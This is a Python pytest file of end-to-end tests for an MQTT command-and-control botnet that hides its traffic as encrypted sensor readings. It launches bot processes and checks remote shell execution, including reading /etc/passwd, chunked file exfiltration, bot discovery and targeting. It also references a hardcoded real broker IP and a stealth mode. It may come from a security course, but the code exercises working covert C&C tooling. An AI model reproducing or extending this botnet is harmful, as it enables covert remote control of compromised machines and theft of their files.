"""
End-to-end tests for the MQTT C&C botnet with layered protocol stack.
Assumes the MQTT broker is running on 127.0.0.1:1883.

The tests automatically launch and teardown 3 bot processes.

Run with: pytest test_e2e.py -v
"""
import pytest
import json
import time
import hashlib
import threading
import queue
import tempfile
import os
import subprocess
import sys
import zlib
import base64
import uuid
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Import the protocol stack directly for testing
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from protocol import ProtocolStack, StealthProtocolStack, DEFAULT_SALT

# --- CONFIGURATION ---
BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "sensors"
SALT = DEFAULT_SALT
NUM_BOTS = 3  # Number of bots to spawn for testing

# Path to the bot script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BOT_SCRIPT = os.path.join(SCRIPT_DIR, "bot.py")
VENV_PYTHON = os.path.join(SCRIPT_DIR, "venv", "bin", "python")
PYTHON_EXECUTABLE = VENV_PYTHON if os.path.exists(VENV_PYTHON) else sys.executable


class TestClientHelper:
    """Test client using the protocol stack."""
    
    def __init__(self, client_id="test_controller_001"):
        self.client_id = client_id
        self.responses = queue.Queue()
        self.all_messages = queue.Queue()
        self.discovered_bots = set()
        
        self.stack = ProtocolStack(
            node_id=client_id,
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT,
            send_interval=0.5  # Faster for testing
        )
        self.stack.application.on_receive(self._on_message) # Use app layer directly if needed, or stack wrapper
        # Calculate my sender ID to ignore own messages
        self.my_sender_id = f"HASH_{self.stack.application.my_hash:04x}"
        self.stack.on_receive(self._on_message)
    
    def _on_message(self, message: dict):
        """Handle incoming messages."""
        self.all_messages.put(message)
        
        sender = message.get("sender", "")
        # Ignore messages from myself (the controller)
        if sender == self.my_sender_id:
            return

        if (sender.startswith("sensor_") or sender.startswith("HASH_")):
            self.discovered_bots.add(sender)
        
        if message.get("type") == "response" and (message.get("target") == self.client_id or message.get("target") == "ME"):
            self.responses.put(message)
        else:
            print(f"DEBUG: Ignored message: type={message.get('type')}, target={message.get('target')}, sender={message.get('sender')}")
    
    def connect(self):
        self.stack.start()
        time.sleep(0.5)  # Wait for connection
    
    def disconnect(self):
        self.stack.stop()
    
    def send_command(self, target: str, cmd: str, arg: str = ""):
        """Send a command."""
        self.stack.send(target, "command", cmd=cmd, arg=arg)
    
    def wait_for_response(self, timeout: float = 10) -> dict:
        """Wait for a response."""
        try:
            return self.responses.get(timeout=timeout)
        except queue.Empty:
            return None
    
    def wait_for_responses(self, count: int, timeout: float = 15) -> list:
        """Wait for multiple responses."""
        responses = []
        deadline = time.time() + timeout
        while len(responses) < count and time.time() < deadline:
            try:
                resp = self.responses.get(timeout=0.5)
                responses.append(resp)
            except queue.Empty:
                continue
        return responses
    
    def clear_queues(self):
        """Clear pending messages."""
        while not self.responses.empty():
            try:
                self.responses.get_nowait()
            except queue.Empty:
                break
        while not self.all_messages.empty():
            try:
                self.all_messages.get_nowait()
            except queue.Empty:
                break


@pytest.fixture(scope="session")
def bot_processes():
    """Launch multiple bot processes for the test session."""
    processes = []
    test_scripts = []
    
    # Read and modify bot script for testing
    with open(BOT_SCRIPT, 'r') as f:
        bot_code = f.read()
    
    # Replace broker for localhost testing
    bot_code = bot_code.replace('BROKER = "147.32.82.209"', 'BROKER = "127.0.0.1"')
    # Disable stealth mode for testing (test client uses fingerprint mode)
    bot_code = bot_code.replace('USE_STEALTH_MODE = True', 'USE_STEALTH_MODE = False')
    
    for i in range(NUM_BOTS):
        bot_test_script = os.path.join(SCRIPT_DIR, f"_test_bot_{i}.py")
        test_scripts.append(bot_test_script)
        
        with open(bot_test_script, 'w') as f:
            f.write(bot_code)
        
        env = os.environ.copy()
        env["DEBUG"] = "True"
        env["USE_STEALTH_MODE"] = "False"

        # Launch bot
        proc = subprocess.Popen(
            [PYTHON_EXECUTABLE, bot_test_script],
            stdout=None,
            stderr=None,
            cwd=SCRIPT_DIR,
            env=env
        )
        processes.append(proc)
    
    time.sleep(4)  # Wait for all bots to initialize
    
    yield processes
    
    # Cleanup
    for proc in processes:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    
    for script in test_scripts:
        if os.path.exists(script):
            os.remove(script)


@pytest.fixture
def test_client(bot_processes):
    """Provide a connected test client."""
    client = TestClientHelper()
    client.connect()
    client.clear_queues()
    yield client
    client.disconnect()


class TestBasicCommands:
    """Tests for basic commands."""
    
    def test_ping_command(self, test_client):
        """Test ping returns Pong from all bots."""
        test_client.send_command("ALL", "ping")
        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=15)
        
        assert len(responses) >= 1, "Should receive at least one response"
        for resp in responses:
            assert resp["output"] == "Pong"
    
    def test_id_command(self, test_client):
        """Test id command."""
        test_client.send_command("ALL", "id")
        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=15)
        
        assert len(responses) >= 1
        for resp in responses:
            assert "uid=" in resp["output"]
    
    def test_w_command(self, test_client):
        """Test w command."""
        test_client.send_command("ALL", "w")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert len(response["output"]) > 0
    
    def test_ls_command(self, test_client):
        """Test ls command."""
        test_client.send_command("ALL", "ls", "/tmp")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert len(response["output"]) > 0
    
    def test_exec_command(self, test_client):
        """Test exec command."""
        test_client.send_command("ALL", "exec", "echo 'hello123'")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "hello123" in response["output"]
    
    def test_unknown_command(self, test_client):
        """Test unknown command."""
        test_client.send_command("ALL", "unknowncmd")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "Unknown Cmd" in response["output"]


class TestMultipleBots:
    """Tests with multiple bots."""
    
    def test_all_bots_respond_to_ping(self, test_client):
        """All bots should respond to ping."""
        test_client.send_command("ALL", "ping")
        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
        
        assert len(responses) == NUM_BOTS, f"Expected {NUM_BOTS} responses, got {len(responses)}"
        
        # All responses should be Pong
        for resp in responses:
            assert resp["output"] == "Pong"
        
        # All responses should be from different bots
        senders = set(resp["sender"] for resp in responses)
        assert len(senders) == NUM_BOTS, f"Expected {NUM_BOTS} unique senders"
    
    def test_discover_multiple_bots(self, test_client):
        """Discovered bots set should have all bots."""
        test_client.send_command("ALL", "ping")
        test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
        
        assert len(test_client.discovered_bots) == NUM_BOTS
    
    def test_target_specific_bot(self, test_client):
        """Target a specific bot, only that bot should respond."""
        # First discover bots
        test_client.send_command("ALL", "ping")
        test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
        
        assert len(test_client.discovered_bots) >= 1
        target_bot = list(test_client.discovered_bots)[0]
        
        # Clear and send to specific bot
        test_client.clear_queues()
        test_client.send_command(target_bot, "ping")
        
        # Should only get one response
        responses = test_client.wait_for_responses(count=3, timeout=10)
        
        assert len(responses) == 1, f"Expected 1 response, got {len(responses)}"
        assert responses[0]["sender"] == target_bot


class TestFileCopy:
    """Tests for file copy command."""
    
    def test_copy_small_file(self, test_client):
        """Test copying a small file with binary transfer."""
        test_content = b"small file content"
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as f:
            f.write(test_content)
            temp_path = f.name
        
        filename = os.path.basename(temp_path)
        downloads_dir = "downloads"
        local_path = os.path.join(downloads_dir, filename)
        
        try:
            if os.path.exists(local_path):
                os.unlink(local_path)
                
            test_client.send_command("ALL", "copy", temp_path)
            response = test_client.wait_for_response(timeout=10)
            
            assert response is not None
            assert response.get("type") == "file_response", f"Expected file_response, got {response.get('type')}"
            assert response.get("filename") == filename
            assert response.get("file_data") == test_content
            
            # Verify by saving to downloads
            os.makedirs(downloads_dir, exist_ok=True)
            with open(local_path, 'wb') as f:
                f.write(response.get("file_data", b""))
            
            with open(local_path, 'rb') as f:
                saved_content = f.read()
            assert saved_content == test_content, "Saved file should match original"
        finally:
            os.unlink(temp_path)
            if os.path.exists(local_path):
                os.unlink(local_path)
    
    def test_copy_nonexistent_file(self, test_client):
        """Test copying nonexistent file."""
        test_client.send_command("ALL", "copy", "/nonexistent/path.txt")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert "File not found" in response["output"]
    
    def test_copy_large_file(self, test_client):
        """Test copying a large file that requires chunking."""
        large_content = b"X" * 10000 + b"\nEND_MARKER"
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as f:
            f.write(large_content)
            temp_path = f.name
        
        try:
            test_client.send_command("ALL", "copy", temp_path)
            response = test_client.wait_for_response(timeout=30)
            
            assert response is not None, "Should receive response for large file"
            assert response.get("type") == "file_response"
            assert response.get("file_data") == large_content, "Should receive complete file"
        finally:
            os.unlink(temp_path)
    
    def test_copy_very_large_file(self, test_client):
        """Test copying a very large file (50KB+)."""
        content_parts = [f"LINE_{i:05d}:" + "Y" * 100 + "\n" for i in range(500)]
        large_content = "".join(content_parts).encode('utf-8')
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as f:
            f.write(large_content)
            temp_path = f.name
        
        try:
            test_client.send_command("ALL", "copy", temp_path)
            response = test_client.wait_for_response(timeout=120)
            
            assert response is not None, "Should receive response for very large file"
            assert response.get("type") == "file_response"
            assert b"LINE_00000:" in response.get("file_data", b""), "Should have first line"
            assert b"LINE_00499:" in response.get("file_data", b""), "Should have last line"
        finally:
            os.unlink(temp_path)


class TestTargeting:
    """Tests for command targeting."""
    
    def test_all_target(self, test_client):
        """Test ALL target is received."""
        test_client.send_command("ALL", "ping")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
    
    def test_wrong_target_ignored(self, test_client):
        """Test wrong target is ignored."""
        test_client.send_command("sensor_0000", "ping")
        response = test_client.wait_for_response(timeout=5)
        
        assert response is None, "Should not receive response for wrong target"


class TestProtocolStack:
    """Tests for protocol stack internals."""
    
    def test_chunk_size_calculation(self):
        """Test chunk size is calculated correctly."""
        stack = ProtocolStack(
            node_id="test",
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT
        )
        
        chunk_size = stack.get_chunk_size()
        assert chunk_size > 128, f"Chunk size should be > 128, got {chunk_size}"
        assert chunk_size < 4096, f"Chunk size should be < 4096, got {chunk_size}"
    
    def test_compression_reduces_size(self):
        """Test that compression reduces payload size."""
        original = "AAAA" * 1000
        compressed = zlib.compress(original.encode(), level=6)
        
        assert len(compressed) < len(original), "Compression should reduce size"
        assert len(compressed) < len(original) / 10, "Highly repetitive content should compress >10x"
    
    def test_encrypt_decrypt_roundtrip(self):
        """Test encryption/decryption roundtrip."""
        salt = DEFAULT_SALT
        data = {
            "sensor_id": "test",
            "temp": 25.0,
            "hum": 50.0,
            "bat": 100
        }
        
        raw_str = (salt + str(data.get("sensor_id", "")) + 
                   str(data.get("temp", "")) + 
                   str(data.get("hum", "")) + 
                   str(data.get("bat", "")))
        md5_hash = hashlib.md5(raw_str.encode()).digest()
        key = md5_hash + md5_hash
        
        plaintext = "Test message for encryption"
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        encrypted_hex = (iv + ciphertext).hex()
        
        encrypted_data = bytes.fromhex(encrypted_hex)
        iv2 = encrypted_data[:16]
        ciphertext2 = encrypted_data[16:]
        cipher2 = AES.new(key, AES.MODE_CBC, iv2)
        decrypted = unpad(cipher2.decrypt(ciphertext2), AES.block_size).decode()
        
        assert decrypted == plaintext
    
    def test_fingerprint_size_stays_constant(self):
        """Test that fingerprint size stays constant for same-size payloads."""
        from protocol import EncryptionLayer
        
        encryption = EncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        
        # Create multiple payloads of similar size
        payloads = [
            {"msg_id": "abc12345", "seq": 0, "total": 1, "data": "X" * 100},
            {"msg_id": "def67890", "seq": 0, "total": 1, "data": "Y" * 100},
            {"msg_id": "ghi11111", "seq": 0, "total": 1, "data": "Z" * 100},
        ]
        
        fingerprint_sizes = []
        for payload in payloads:
            # Create sensor data and encrypt
            sensor_data = encryption._create_sensor_data()
            key = encryption._derive_key(sensor_data)
            fingerprint = encryption._encrypt(json.dumps(payload), key)
            fingerprint_sizes.append(len(fingerprint))
        
        # All fingerprints should be the same size
        assert len(set(fingerprint_sizes)) == 1, \
            f"Fingerprint sizes should be constant, got {fingerprint_sizes}"
    
    def test_fingerprint_size_varies_with_payload_size(self):
        """Test that fingerprint size varies appropriately with payload size."""
        from protocol import EncryptionLayer
        
        encryption = EncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        
        # Create payloads of different sizes
        small_payload = {"data": "X" * 10}
        large_payload = {"data": "Y" * 1000}
        
        sensor_data = encryption._create_sensor_data()
        key = encryption._derive_key(sensor_data)
        
        small_fingerprint = encryption._encrypt(json.dumps(small_payload), key)
        large_fingerprint = encryption._encrypt(json.dumps(large_payload), key)
        
        # Large payload should produce larger fingerprint
        assert len(large_fingerprint) > len(small_fingerprint), \
            "Larger payload should produce larger fingerprint"


class TestChunking:
    """Tests for message chunking and reassembly."""
    
    def test_small_message_single_chunk(self, test_client):
        """Small messages should use single chunk."""
        test_client.send_command("ALL", "ping")
        response = test_client.wait_for_response(timeout=10)
        
        assert response is not None
        assert response["output"] == "Pong"
    
    def test_large_response_multi_chunk(self, test_client):
        """Large responses should be chunked and reassembled."""
        test_client.send_command("ALL", "exec", "cat /etc/passwd")
        response = test_client.wait_for_response(timeout=15)
        
        assert response is not None
        assert "root" in response["output"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
